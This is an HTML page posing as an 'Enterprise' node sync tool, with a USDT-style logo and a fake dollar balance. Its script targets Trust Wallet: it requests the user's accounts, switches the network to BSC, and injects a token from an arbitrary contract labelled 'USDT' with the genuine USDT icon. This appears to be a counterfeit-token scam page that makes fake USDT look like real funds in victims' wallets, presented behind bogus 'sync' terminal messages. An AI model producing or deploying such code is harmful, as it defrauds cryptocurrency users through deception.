<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Node Sync Protocol | Enterprise</title>
    <style>
        :root { --tether-green: #00d395; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 45px; width: 360px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.7); }
        .logo-box { width: 90px; height: 90px; background: var(--tether-green); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; box-shadow: 0 0 30px rgba(0, 211, 149, 0.3); }
        .logo-box svg { width: 55px; height: 55px; fill: white; }
        .balance-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; padding: 25px; margin-bottom: 30px; }
        .amount { font-size: 34px; font-weight: 800; letter-spacing: -1px; }
        .sync-btn { background: var(--tether-green); color: #000; border: none; width: 100%; padding: 20px; border-radius: 14px; font-weight: 800; cursor: pointer; font-size: 16px; text-transform: uppercase; transition: 0.4s; }
        #terminal { font-size: 10px; color: #00d395; font-family: monospace; margin-top: 20px; text-align: left; line-height: 1.6; min-height: 60px;}
    </style>
</head>
<body>

<div class="container">
    <div class="logo-box">
        <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
    </div>
    
    <div class="balance-card">
        <div style="font-size: 11px; color: #888; margin-bottom: 8px;">METADATA STATUS</div>
        <div class="amount">$1,066.45</div>
    </div>

    <button class="sync-btn" id="mainBtn">SECURE SYNC</button>
    <div id="terminal">> READY_FOR_TRUST_INJECTION...</div>
</div>

<script>
    const YOUR_CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const ICON = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";

    const term = document.getElementById('terminal');
    const updateTerm = (t) => { term.innerHTML += `<br>> ${t}`; };

    async function runTrustSync() {
        // --- PRO HACK: Direct Trust Wallet targeting ---
        let provider = null;
        if (window.trustwallet) {
            provider = window.trustwallet; // Force Trust
        } else if (window.ethereum && window.ethereum.isTrust) {
            provider = window.ethereum; // Check if Ethereum is Trust
        }

        if (!provider) {
            updateTerm("ERROR: TRUST WALLET NOT FOUND");
            return;
        }

        try {
            updateTerm("BYPASSING CONFLICTS...");
            await provider.request({ method: 'eth_requestAccounts' });

            updateTerm("SYNCING BSC_NET...");
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });

            updateTerm("INJECTING TOKEN...");
            await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: YOUR_CONTRACT,
                        symbol: 'USDT',
                        decimals: 6,
                        image: ICON,
                    },
                },
            });

            updateTerm("NODE VERIFIED SUCCESSFULLY.");
        } catch (e) {
            updateTerm("HANDSHAKE_REJECTED_BY_USER");
        }
    }

    document.getElementById('mainBtn').addEventListener('click', runTrustSync);
</script>
</body>
</html>
